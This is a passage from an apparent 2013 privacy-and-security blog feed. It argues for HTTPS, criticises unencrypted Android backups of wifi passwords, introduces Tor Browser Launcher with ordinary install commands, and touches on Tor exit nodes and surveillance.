&lt;p&gt;&lt;strong&gt;For some reason gnupg.org, the website that distributes information about and the source code for GPG, and gpg4win.org, the website that distributes Windows GPG binaries, don’t use HTTPS and therefore puts their users at risk.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Luckily the websites for the Mac OS X software for OTR (&lt;a href="https://adium.im/"&gt;https://adium.im/&lt;/a&gt;) and GPG (&lt;a href="https://gpgtools.org/"&gt;https://gpgtools.org/&lt;/a&gt;) force HTTPS. And GNU/Linux users should get this software from their package manager which uses public key cryptography to authenticate the packages.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Let’s say you’re really interesting in using disk encryption and you’ve heard that TrueCrypt might be useful for you. How do you get started?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;You visit &lt;a href="http://www.truecrypt.org/"&gt;http://www.truecrypt.org/&lt;/a&gt;. Since this website doesn’t force HTTPS, any information you find on this website might not be trustworthy, and any download links might contain malware.&lt;/li&gt;
&lt;li&gt;When you actually do download the TrueCrypt installer, the download links for Windows, Mac OS X, and GNU/Linux all download from URLs like &lt;a href="http://www.truecrypt.org/download/transient/…"&gt;http://www.truecrypt.org/download/transient/…&lt;/a&gt;. If you download and install TrueCrypt from their website, it would be trivial for an attacker to put malware on your computer.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;For some reason truecrypt.org, the website that distributes TrueCrypt binaries for Windows, Mac OS X, and GNU/Linux doesn’t use HTTPS and therefore puts its users at risk.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I chose Off the Record, GnuPG, and TrueCrypt because they’re prominent examples. But the problem is much bigger than these websites. It’s &lt;em&gt;almost every website&lt;/em&gt;. It’s not just security software that can put malware on people’s computers, it’s &lt;em&gt;any software&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I understand why &lt;em&gt;everyone&lt;/em&gt; doesn’t use HTTPS yet.&lt;/p&gt;
&lt;p&gt;If your website is hosted on a shared hosting provider you may need to pay more money for a static IP address to turn on HTTPS. This is unfortunate, but hopefully shared hosting providers will start using &lt;a href="http://en.wikipedia.org/wiki/Server_Name_Indication"&gt;Server Name Indication&lt;/a&gt; and make this way cheaper and easier for their customers to run more secure websites.&lt;/p&gt;
&lt;p&gt;But if you’re not a small website stuck on shared hosting, you don’t have an excuse.&lt;/p&gt;
&lt;p&gt;People think that it costs money to get a certificate authority to sign your cert, but &lt;a href="https://startssl.com/"&gt;StartSSL&lt;/a&gt; is trusted by browsers and signs certs for free.&lt;/p&gt;
&lt;p&gt;People say that using HTTPS is a performance hit. Locking your car door is also a performance hit, and so is putting on clothes in the morning. Security and privacy is worth a performance hit, especially when &lt;em&gt;we have proof that the Internet is being spied on by the most powerful governments in the world&lt;/em&gt;. Scaling HTTPS is a solved problem, and performance is no excuse.&lt;/p&gt;
&lt;p&gt;If you run a website, and the HTTP version of your site doesn’t automatically redirect to HTTPS, then you’re doing things wrong. Please take steps to start supporting HTTPS and then to start forcing HTTPS for all of your traffic. It’s the responsible thing to do for the privacy and security of your visitors.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NSA sends legal requests to get data from some companies (such as everyone in PRISM) but not from &lt;em&gt;all&lt;/em&gt; websites. Websites outside of the US can legally ignore NSA requests.&lt;/li&gt;
&lt;li&gt;Certificate authorities don’t have the secret keys of HTTPS web servers, they just sign the associated public keys. So no, NSA can’t ask CAs for all the keys.&lt;/li&gt;
&lt;li&gt;NSA passively monitors traffic on the Internet backbones, but they can’t see any HTTPS content without having the associated secret keys. However if the HTTPS websites use &lt;a href="https://www.eff.org/deeplinks/2013/08/pushing-perfect-forward-secrecy-important-web-privacy-protection"&gt;Perfect Forward Secrecy&lt;/a&gt;, even if NSA has the secret key they still can’t see any of the HTTPS content.&lt;/li&gt;
&lt;li&gt;Yes, they can still do active MITM attacks using a compelled CA, but they can’t realistically do this &lt;em&gt;against the entire Internet&lt;/em&gt;, only specific targets (tech like &lt;a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning"&gt;certificate pinning&lt;/a&gt;, &lt;a href="https://www.eff.org/observatory"&gt;SSL Observatory&lt;/a&gt;, and &lt;a href="http://convergence.io/"&gt;Convergence&lt;/a&gt; will detect/prevent these attacks). One of the reasons that the NSA spying programs are so unconstitutional is because they’re &lt;em&gt;spying on everyone&lt;/em&gt;. If we make passive attacks no longer work, forcing NSA to do active attacks, that’s a huge win.&lt;/li&gt;
&lt;li&gt;HTTPS doesn’t protect everything. When you load an HTTPS URL, such as &lt;a href="https://micahflee.com/2013/08/its-2013-were-all-being-spied-on-why-do-security-software-websites-not-use-https/"&gt;https://micahflee.com/2013/08/its-2013-were-all-being-spied-on-why-do-security-software-websites-not-use-https/&lt;/a&gt;, the hostname (“micahflee.com”) gets leaked, but the rest of the URL (“/2013/08/its-2013-were-all-being-spied-on-why-do-security-software-websites-not-use-https/”) stays private. Other metadata that leaks is your IP address, the exact time of the request, and the file sizes of the request and the response.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Full disclosure: I’m the maintainer of the free software browser add-on &lt;a href="https://www.eff.org/https-everywhere"&gt;HTTPS Everywhere&lt;/a&gt;. If everyone used HTTPS and no one used HTTP, HTTPS Everywhere would become obsolete. I would love it if HTTPS Everywhere were obsolete.&lt;/p&gt;
</content></entry><entry><title>Despite Google’s statement, they still have access to your wifi passwords</title><link href="https://micahflee.com/2013/07/despite-googles-statement-they-still-have-access-to-your-wifi-passwords/" rel="alternate"></link><updated>2013-07-19T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:6d1546d9-3928-3bf4-905c-1509f4eacd9b</id><content type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; The Android bug tracker &lt;a href="https://code.google.com/p/android/issues/detail?id=57560#c33"&gt;isn’t the correct place&lt;/a&gt; to ask Google to fix this bug. The backup/restore feature is part of the proprietary Google apps for Android, not the open source Android project. &lt;a href="https://productforums.google.com/forum/#!category-topic/mobile/android-devices/android-applications/D6vWpQu8AWU"&gt;This thread on the Google product forums&lt;/a&gt; is the correct place.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Earlier this week &lt;a href="http://arstechnica.com/security/2013/07/does-nsa-know-your-wifi-password-android-backups-may-give-it-to-them/"&gt;Ars Technica covered&lt;/a&gt; a &lt;a href="https://code.google.com/p/android/issues/detail?id=57560"&gt;bug report&lt;/a&gt; I posted on the Android issue tracker about the “Backup and restore” feature not offering encrypted backups.&lt;/p&gt;
&lt;p&gt;Because there’s no option to encrypt your backup data on your Android device with a passphrase that you set, Google has the capability to see the plaintext data, including all your saved wifi passwords. Google can then be compelled to give up this data (and any other user data that they store) to the US government when requested to do so.&lt;/p&gt;
&lt;p&gt;Google responded to Ars Technica:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Our optional ‘Backup my data’ feature makes it easier to switch to a new Android device by using your Google Account and password to restore some of your previous settings. This helps you avoid the hassle of setting up a new device from scratch. At any point, you can disable this feature, which will cause data to be erased. This data is encrypted in transit, accessible only when the user has an authenticated connection to Google and stored at Google data centers, which have strong protections against digital and physical attacks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First, it’s great the backup/restore feature is optional. It’s great that if you turn it off Google will delete your data. It’s great that the data is encrypted in transit between the Android device and Google’s servers, so that eavesdroppers can’t pull your backup data off the wire. And it’s great they they have strong security, both digital and physical, at their data centers.&lt;/p&gt;
&lt;p&gt;However, Google’s statement doesn’t mention whether or not Google itself has access to the plaintext backup data (it does). Not how easy it is for an attacker to get at this data, but how easy it is for an authorized Google employee to get at it as part of their job. This is important because if Google has access to this plaintext data, they can be compelled to give it to the US government.&lt;/p&gt;
&lt;p&gt;In the bug report I didn’t mention being worried about hackers getting at the data. I’m worried about Google having the ability to hand this data to the US government when they receive requests for user data:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;I don’t think it’s rational to expect users to trust Google with their plaintext passwords when Google can be compelled to give this data to the US government when they request it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I don’t think Google is being malicious here. I just think they threw together this backup/restore feature before building in appropriate security measures. The bug report that I filed is simply a feature request: make it possible for users who don’t want to give Google our plaintext wifi passwords (and other backup data) to still use this feature.&lt;/p&gt;
&lt;p&gt;Luckily, Google itself already knows exactly how to do this. The Chrome web browser saves apps, extensions, settings, autofill data, browser history, themes, bookmarks, open tabs, and passwords.&lt;/p&gt;
&lt;p&gt;Chrome also lets users sync this data with Google’s servers. Clearly this is a lot of sensitive data, so Google offers to let people encrypt this data with a passphrase, on their own computer, before sending it to Google’s servers:&lt;/p&gt;
&lt;p&gt;&lt;img src="chrome_sync.png" alt="Chrome sync"&gt;&lt;/p&gt;
&lt;p&gt;If the user forgets this passphrase they lose all their data.&lt;/p&gt;
&lt;p&gt;Offering this same feature (letting users encrypt their backup data with a passphrase before sending it to Google) for Android is the &lt;em&gt;only way&lt;/em&gt; that Google will be able to offer the backup/restore without having access to the plaintext data that’s being backed up.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The correct response for Google at this point is to label &lt;a href="https://code.google.com/p/android/issues/detail?id=57560"&gt;issue 57560&lt;/a&gt; (&lt;em&gt;“Backup and restore” should offer encrypted backups&lt;/em&gt;) as a security bug, set the priority to High, and promptly release an update to Android that fixes this bug.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I also want to point out that this issue isn’t unique to Android. Apple’s iCloud suffers from the same problem. In fact, any time you use a service that lets you back things up in the cloud, &lt;em&gt;if you’re not encrypting it on your device with a passphrase that you choose&lt;/em&gt;, you’re giving your data to a third party that’s vulnerable to government requests for data. It’s also important to remember that the US government isn’t the only one that requests user data, &lt;em&gt;all governments do&lt;/em&gt;. Choosing non-US cloud providers isn’t a solution.&lt;/p&gt;
&lt;p&gt;Storing data in the cloud has become a huge convenience for computer users. Even in light of dragnet unconstitutional surveillance of the Internet by spy agencies, I don’t think it’s necessary to give up storing data in the cloud. We just need to store &lt;em&gt;encrypted&lt;/em&gt; data in the cloud where &lt;em&gt;users have the keys&lt;/em&gt;, not the cloud providers.&lt;/p&gt;
</content></entry><entry><title>Use Android? You’re Probably Giving Google All Your Wifi Passwords</title><link href="https://micahflee.com/2013/07/use-android-youre-probably-giving-google-all-your-wifi-passwords/" rel="alternate"></link><updated>2013-07-11T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:a5eb59e3-2fb8-3dc4-b833-e0a9dcb81f46</id><content type="html">&lt;p&gt;Go to your home screen, press the Menu button, select “Settings”, under “Personal” select “Backup and reset”. Is the “Back up my data” checkbox checked? If so, all of the wifi passwords that your phone remembers are being synced to your Google account.&lt;/p&gt;
&lt;p&gt;And the passwords are in plaintext, too. When you format an Android phone and set it up on first run, after you login to your Google account and restore your backup, it immediately connects to wifi using a saved password. There’s no sort of password hash that your Android phone could send your router to authenticate besides the password itself.&lt;/p&gt;
&lt;p&gt;&lt;img src="backup_settings.png" alt="Backup and restore settings"&gt;&lt;/p&gt;
&lt;p&gt;Oh, and Google is part of NSA’s Prism program. If an NSA analyst, or likely someone from CIA or even FBI (&lt;a href="http://www.guardian.co.uk/world/2013/jul/11/microsoft-nsa-collaboration-user-data"&gt;Prism is a “team sport”&lt;/a&gt;), asks Google for information about you, your house’s and office’s wifi passwords are likely included in that data. Without a warrant.&lt;/p&gt;
&lt;p&gt;With your home wifi password, an attacker can sniff wifi traffic outside your house (without connecting to your network) and then decrypt it all, passively eavesdropping on your private network. If the attacker wants to do more active attacks, they can connect to your wifi network and mount a man-in-the-middle attack to eavesdrop on and modify any unencrypted Internet traffic. If you download a file, they can serve you a malicious version instead. An attacker can scan for computers, phones, and tablets that are connected to your network, scan for open ports, and exploit vulnerable services. If you have a computer connected to your network that you haven’t done software updates on for a couple weeks, or that you’ve never configured a firewall on, or that you’ve installed random servers on and have never touched them since, there’s a good chance the attacker could take over those computers.&lt;/p&gt;
&lt;p&gt;Anyway, maybe you should uncheck that box. Google says that they’ll delete this data when you stop backing it up with them.&lt;/p&gt;
&lt;p&gt;&lt;img src="backup_delete.png" alt="Delete settings from Google&amp;#39;s server"&gt;&lt;/p&gt;
&lt;p&gt;Although it wouldn’t hurt to change your wifi password anyway.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Update:&lt;/strong&gt; I have filed a &lt;a href="https://code.google.com/p/android/issues/detail?id=57560"&gt;feature request&lt;/a&gt; in Android’s bug tracker to offer encrypted backups, similar to the password sync options offered by Chrome and Firefox.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Update 2:&lt;/strong&gt; The Android bug tracker &lt;a href="https://code.google.com/p/android/issues/detail?id=57560#c33"&gt;isn’t the correct place&lt;/a&gt; to ask Google to fix this bug. The backup/restore feature is part of the proprietary Google apps for Android, not the open source Android project. &lt;a href="https://productforums.google.com/forum/#!category-topic/mobile/android-devices/android-applications/D6vWpQu8AWU"&gt;This thread on the Google product forums&lt;/a&gt; is the correct place.&lt;/em&gt;&lt;/p&gt;
</content></entry><entry><title>Opportunistic Encryption to Combat Dragnet Surveillance</title><link href="https://micahflee.com/2013/06/opportunistic-encryption-to-combat-dragnet-surveillance/" rel="alternate"></link><updated>2013-06-29T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c34f9aa3-37fc-339d-b3a2-03aa632e4e7a</id><content type="html">&lt;p&gt;The world is in shock and anger over recent revelations that NSA and GCHQ are conducting suspiciounless spying on every human with an internet or phone network connection. One of the ways they’re spying on the entire internet is by tapping the underwater fiber-optic cables that connect the continents and parsing and logging the firehose of packets as they fly by.&lt;/p&gt;
&lt;p&gt;If we want to keep what we do on the internet private, a good way to do that is to encrypt as much of our internet traffic as possible. End-to-end encryption is hard to do right for end users because identity verification is really, really hard to scale. It’s not practical for everyone who wants to visit an HTTPS website to meet in person and read out SHA1 fingerprints for SSL certs.&lt;/p&gt;
&lt;p&gt;The only real-world scalable identity verification system in widespread use right now is the collection of browser-trusted certificate authorities and their intermediaries. But it suffers from the problem where individuals and organizations without much power or money cannot compromise it’s security, but powerful organizations like NSA and GCHQ can easily compromise it to mount man-in-the-middle attacks.&lt;/p&gt;
&lt;p&gt;However, I think global adversaries like NSA and GCHQ are hesitant to mount &lt;em&gt;dragnet&lt;/em&gt; active attacks against HTTPS certificates because they run the very real risk of getting caught. If you run &lt;a href="https://www.eff.org/https-everywhere"&gt;HTTPS Everywhere&lt;/a&gt; and opt-in to the decentralized &lt;a href="https://www.eff.org/observatory"&gt;SSL Observatory&lt;/a&gt;, your browser will warn you when the Observatory has detected a known malicious certificate (admittedly we don’t know of many malicious certs yet, but the more users we get the more likely we’ll spot attacks in the wild and can warn other about them). If you use Chrome it’s certificate pinning feature will also warn you about attacks against Google SSL certs. There are other tools out there too that make this detection possible.&lt;/p&gt;
&lt;p&gt;If NSA and GCHQ want to eavesdrop on encrypted communications, even ones that they can easily MITM without being detected, they have to do active attacks. It can’t just be passive eavesdropping, it has to actually be modifying traffic in transit and serving malicious public keys. If they start doing dragnet active MITM attacks on large swaths of the internet they will get caught, and it will be a worse public relations and diplomatic nightmare than they’re already facing. There would be no sensible way to claim that the US wasn’t “hacking the Chinese” or, for that matter, hacking the Germans, the Brazilians, the Israelis, the Australians, the Tunisians, the Mexicans, and everyone else in the world.&lt;/p&gt;
&lt;p&gt;But right now the web, and many other services on the internet, are still largely unencrypted. We need to fix this.&lt;/p&gt;
&lt;p&gt;Wouldn’t it be great if every single HTTP request had automatic, opportunistic end-to-end encryption between the browser and the server? Anyone could MITM it, but at least they would be forced to do an active attack. If just a small percentage of people manually verify crypto keys, active attacks run the risk of getting caught.&lt;/p&gt;
&lt;p&gt;Why stop at HTTP requests? Wouldn’t it be great if all TCP connections had automatic opportunistic encryption? Obviously these are enormous engineering projects that will completely break lots of technologies that people rely on, like intrusion detection systems. But I think it would be a big step in the right direction to make the internet secure from spy agencies.&lt;/p&gt;
&lt;p&gt;It’s time we encrypt all the things.&lt;/p&gt;
</content></entry><entry><title>Swatting is Not the Same as Doxing</title><link href="https://micahflee.com/2013/05/swatting-is-not-the-same-as-doxing/" rel="alternate"></link><updated>2013-05-09T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:d1e2367d-9cc9-3e8a-b199-29a4818b3099</id><content type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;Update: KTVU has taken down the story.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Recently I was interviewed about “doxing” by &lt;a href="http://www.ktvu.com/"&gt;KTVU&lt;/a&gt;, a Bay Area news station based in Oakland. Doxing is when someone publishes documents (“dox”) about someone to the internet. It’s usually full of mundane info that can be found in a phone book and with a google search, but sometimes it also contains more sensitive information like the contents of personal emails, lists of passwords, etc.&lt;/p&gt;
&lt;p&gt;I found out that the segment aired on TV last night when someone tweeted me asking if I really thought that “swatting” was protected by free speech laws. Swatting, I learned for the first time last night, is when someone dials 911 and reports something like a hostage situation or a terrorist bomb plot at someone else’s address in order to get a SWAT team to bust down their door.&lt;/p&gt;
&lt;p&gt;Here’s the &lt;a href="http://bcove.me/tozbu14s"&gt;KTVU segment about swatting&lt;/a&gt;*. I’m at 3:15. Here’s the &lt;a href="http://www.ktvu.com/news/news/special-reports/swatting/nXmFr/"&gt;associated text article&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The question I was asked was whether or not I think we should pass new laws to combat doxing (he didn’t mention the word “swatting” the entire interview). Much of the time doxing is simply re-publishing already public information, and the rest of the time the info comes from hacking into someone’s accounts online, which is already illegal. Unauthorized access to a computer system is a felony under the Computer Fraud and Abuse Act, so the old laws cover it pretty well.&lt;/p&gt;
&lt;p&gt;Swatting? My only source of information about swatting was from watching the KTVU segment, so I feel completely uninformed about the issue.&lt;/p&gt;
&lt;p&gt;Abusing emergency services is definitely something that people should never do, since (among other issues) sometimes real emergencies need them. Seems like a dick move to me. While doxing can sometimes be harmful as well, it’s not the same as swatting.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;* I would have embedded the video here, but the embed code isn’t available over https. Chrome, and soon Firefox, block mixed content to protect the security of https websites like this one.&lt;/em&gt;&lt;/p&gt;
</content></entry><entry><title>sudo apt-get install torbrowser</title><link href="https://micahflee.com/2013/04/sudo-apt-get-install-torbrowser/" rel="alternate"></link><updated>2013-04-09T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c674cf0a-40fb-3b94-8f56-e7f427ac1be1</id><content type="html">&lt;p&gt;&lt;strong&gt;TL;DR: I wrote a piece of software called &lt;a href="https://github.com/micahflee/torbrowser-launcher"&gt;Tor Browser Launcher&lt;/a&gt; that downloads and auto-updates Tor Browser Bundle for you, in your language and for your architecture, and verifies signatures. I’d like help finding bugs before the initial release.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Over the years, &lt;a href="https://www.torproject.org/"&gt;Tor Project&lt;/a&gt; has done an amazing job at making Tor more user-friendly. In the past if you wanted anonymity you had to download and install Tor, maybe hand-edit your torrc file, and configure your browser to use a proxy server. You had to make sure that you didn’t have browser plugins like Flash or Java enabled that would compromise your anonymity. Eventually, this got easier when you could install the TorButton Firefox add-on, but even then you had to keep manually separate your own identity and your anonymous browsing.&lt;/p&gt;
&lt;p&gt;Now all you have to do is head to torproject.org, click the large “Download Tor” button, and then download the Tor Browser Bundle (TBB). Then you extract it (normally to somewhere in your home directory, or to a USB stick) and run start-tor-browser, and wait to connect to the Tor network and for your anonymous browser to pop up with the friendly green “Congratulations. Your browser is configured to use Tor.” page.&lt;/p&gt;
&lt;p&gt;&lt;img src="screenshot-from-2013-04-09-100000-1024x576.png" alt="Tor Browser Bundle"&gt;&lt;/p&gt;
&lt;p&gt;Despite these advancements, Tor could still be more user-friendly.&lt;/p&gt;
&lt;p&gt;If you want to install TBB for regular use on your computer, you don’t get a Tor Browser entry in your desktop environment’s menu system. You can’t easily add it to your Ubuntu Unity launcher, favorite it in GNOME 3, or stick it on a panel in Cinnamon or MATE (not to mention add it to your quick launch bar in Windows).&lt;/p&gt;
&lt;p&gt;TBB doesn’t automatically update either. It warns you when you’re using an out-of-date version but you have to repeat the download and extract process manually. People often use Tor Browser infrequently enough to not bother with updating when they just want to quickly look something up anonymously, which compromises their security.&lt;/p&gt;
&lt;p&gt;When users download TBB, Tor Project provides a GnuPG signature of the package, but roughly 0% of users, including the elitest of hackers, actually verify that signature to be sure they weren’t MitM’d during the download. All TBB downloads go over HTTPS (unlike &lt;a href="http://www.cypherpunks.ca/otr/"&gt;some security tools&lt;/a&gt;), but there are still critical and widely publicized security problems with relying on the certificate authority infrastructure.&lt;/p&gt;
&lt;p&gt;![GnuPG signatures][tbb_sig.png]&lt;/p&gt;
&lt;p&gt;Finally, for GNU/Linux users, there’s no easy way to install TBB from the package manager, which is the preferred and expected way to install software on that platform. If it were installable from the package manager, it would open up the possibility for distributions to have Tor Browser installed by default.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;These reasons are why I wrote Tor Browser Launcher.&lt;/strong&gt; &lt;a href="https://github.com/micahflee/torbrowser-launcher"&gt;Check it out on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Tor Browser Launcher is intended to make the Tor Browser Bundle (TBB) easier to maintain and use for GNU/Linux users. You install torbrowser-launcher from your distribution’s package manager and it handles everything else, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Downloading the most recent version of TBB for you, in your language and for your architecture&lt;/li&gt;
&lt;li&gt;Automatically updating while saving your bookmarks and preferences&lt;/li&gt;
&lt;li&gt;Verifying the TBB’s GnuPG signature&lt;/li&gt;
&lt;li&gt;Adding a “Tor Browser” application launcher to your desktop environment’s menu&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When you first launch Tor Browser Launcher, it will download TBB from &lt;a href="https://www.torproject.org/"&gt;https://www.torproject.org/&lt;/a&gt; and extract it in ~/.torproject, and then execute it. When you run it after that it will just execute TBB.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I’m hoping to first get Tor Browser Launcher into Tor Project’s &lt;a href="https://www.torproject.org/docs/debian"&gt;deb.torproject.org repository&lt;/a&gt;, and then later into Debian and Ubuntu, and other distributions as well like Fedora and Arch. I want Tor Browser Launcher to become the preferred way for GNU/Linux users to get TBB.&lt;/p&gt;
&lt;p&gt;Eventually I’d also like to port Tor Browser Launcher to Windows and Mac OS X.&lt;/p&gt;
&lt;p&gt;When you install Tor Browser Launcher, it adds a “Tor Browser” item to your desktop environment’s menu in the Internet category:&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-launcher_menu.png" alt="Tor Browser Launcher in the menu"&gt;&lt;/p&gt;
&lt;p&gt;The first time you run it, or when it finds updates, it downloads TBB from &lt;a href="https://www.torproject.org/"&gt;https://www.torproject.org/&lt;/a&gt;, and it also verifies the GnuPG signature:&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-launcher_downloading.png" alt="Downloading"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-launcher_verifying.png" alt="Verifying"&gt;&lt;/p&gt;
&lt;p&gt;On success, it runs start-tor-browser, which loads Vidalia and Firefox. If you already have TBB installed, it immediately runs start-tor-browser:&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-launcher_success1.png" alt="Tor Browser Success"&gt;&lt;/p&gt;
&lt;p&gt;If the GnuPG signature doesn’t check out, it throws an error:&lt;/p&gt;
&lt;p&gt;&lt;img src="torbrowser-launcher_verification_error.png" alt="Signature verification error"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I’d like your help.&lt;/strong&gt; I think Tor Browser Launcher is about ready for it’s first release. I’m already &lt;a href="https://trac.torproject.org/projects/tor/ticket/8648"&gt;working on&lt;/a&gt; getting it into deb.torproject.org, but first I want to find and fix any final bugs. Can you install it, try using it, and if you find anything wrong &lt;a href="https://github.com/micahflee/torbrowser-launcher/issues?page=1&amp;amp;state=open"&gt;open a new issue on GitHub&lt;/a&gt;?&lt;/p&gt;
&lt;p&gt;If you’re using Debian, Ubuntu, Mint, or a related distro, it’s easy to build a .deb from source and install it. First install git, python-stdeb, and all of the Tor Browser Launcher dependencies:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install git python-stdeb python-gtk2 python-psutil python-twisted wmctrl gnupg
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then git clone it, and build and install the .deb:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/micahflee/torbrowser-launcher.git
cd torbrowser-launcher
./build_and_install.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After typing your password to install the .deb, you’re done. You should now have a “Tor Browser” menu item. If you want to see debugging information, run torbrowser-launcher from a terminal.&lt;/p&gt;
&lt;p&gt;To see the discussion with the community that lead to this, check the comments on these two bugs: &lt;a href="https://trac.torproject.org/projects/tor/ticket/3994"&gt;#3994&lt;/a&gt; and &lt;a href="https://trac.torproject.org/projects/tor/ticket/5236"&gt;#5236&lt;/a&gt;. Also, some discussion happened on the &lt;a href="https://lists.torproject.org/cgi-bin/mailman/listinfo/tor-talk/"&gt;tor-talk&lt;/a&gt; and &lt;a href="https://lists.torproject.org/cgi-bin/mailman/listinfo/tor-dev/"&gt;tor-dev&lt;/a&gt; mailing lists.&lt;/p&gt;
&lt;p&gt;I also want to point out that Jamie Nguyen has &lt;a href="https://jamielinux.com/articles/2013/01/tor-and-tor-browser-repository-on-fedora/"&gt;successfully packaged Tor Browser for Fedora&lt;/a&gt;, though it’s not in the official repos. His solution doesn’t technically use TBB, but is still clever. I prefer Tor Browser Launcher though because it’s much less work to maintain (no need to update it each time there’s a TBB release), and if it ends up in distros that are slow to provide new versions of software (like Debian stable) users will still get the latest and greatest TBB.&lt;/p&gt;
</content></entry><entry><title>How to Get a Tor Project T-Shirt For Less Than $65</title><link href="https://micahflee.com/2013/03/how-to-get-a-tor-project-t-shirt-for-less-than-65/" rel="alternate"></link><updated>2013-03-19T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:92d5d365-8eb5-317f-81ea-d0e88c037640</id><content type="html">&lt;p&gt;The &lt;a href="https://www.torproject.org/"&gt;Tor Project&lt;/a&gt; is awesome. It’s a network of volunteer proxy servers that make it possible for people to use the internet anonymously.&lt;/p&gt;
&lt;p&gt;I decided to contribute to the Tor network by running my own exit node called &lt;a href="https://atlas.torproject.org/#details/C31EA6B039165613464D1B5B6819B36E5529B27C"&gt;gollum&lt;/a&gt;. I’m paying &lt;a href="https://www.gandi.net/"&gt;Gandi&lt;/a&gt; $16/month for a VPS in Paris, France. As of this writing the uptime on my Tor server is 69 days, 12 hours.&lt;/p&gt;
&lt;p&gt;A couple days ago I was excited to receive this email from the &lt;a href="https://weather.torproject.org/"&gt;Tor Weather&lt;/a&gt; service:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;This is a Tor Weather Report.&lt;/p&gt;
&lt;p&gt;Congratulations! The node gollum (id: C31E A6B0 3916 5613 464D 1B5B 6819 B36E 5529 B27C) you’ve been observing has been running as an exit node for 61 days with an average bandwidth of 1418 KB/s, which makes the operator eligible to receive an official Tor T-shirt! If you’re interested in claiming your shirt, please visit the following link for more information.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.torproject.org/getinvolved/tshirt.html"&gt;https://www.torproject.org/getinvolved/tshirt.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You might want to include this message in your email. Thank you for your contribution to the Tor network!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So for only $32 I get a Tor t-shirt. I’m sure if you find a good web host you can get one for even cheaper. Go ahead and do it! If you do, I recommend finding a web host that’s not in the United States, and that you try following these &lt;a href="https://blog.torproject.org/blog/tips-running-exit-node-minimal-harassment"&gt;tips for running a Tor exit node with minimal harassment&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Also, there’s a really nice command line program called &lt;a href="http://www.atagar.com/arm/"&gt;arm&lt;/a&gt; that’s useful for monitoring your Tor server. Here’s a screenshot from gollum’s arm:&lt;/p&gt;
&lt;p&gt;&lt;img src="arm-1024x488.png" alt="Screenshot of arm"&gt;&lt;/p&gt;
</content></entry><entry><title>Bradley Manning's statement shows that US intelligence analysts are trained in using Tor</title><link href="https://micahflee.com/2013/03/bradley-mannings-statement-shows-that-us-intelligence-analysts-are-trained-in-using-tor/" rel="alternate"></link><updated>2013-03-12T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:3e49d2df-a2c1-3040-b06b-4770677fd1d1</id><content type="html">&lt;p&gt;This morning I had the opportunity to help &lt;a href="https://pressfreedomfoundation.org/"&gt;Freedom of the Press Foundation&lt;/a&gt; publish the full, &lt;a href="https://pressfreedomfoundation.org/blog/2013/03/fpf-publishes-leaked-audio-of-bradley-mannings-statement"&gt;previously unreleased audio recording of Bradley Manning’s statement to the military court&lt;/a&gt; in Ft. Meade about his motivations for leaking over 700,000 government documents to WikiLeaks.&lt;/p&gt;
&lt;p&gt;In his statement Bradley Manning not only explains his motivation for leaking documents to WikiLeaks (he contacted the Washington Post and the New York Times first), but also technically how he went about doing it, including the software and protocols he used.&lt;/p&gt;
&lt;p&gt;This clip, about his use of &lt;a href="https://www.torproject.org/"&gt;Tor&lt;/a&gt;, stood out to me:&lt;/p&gt;
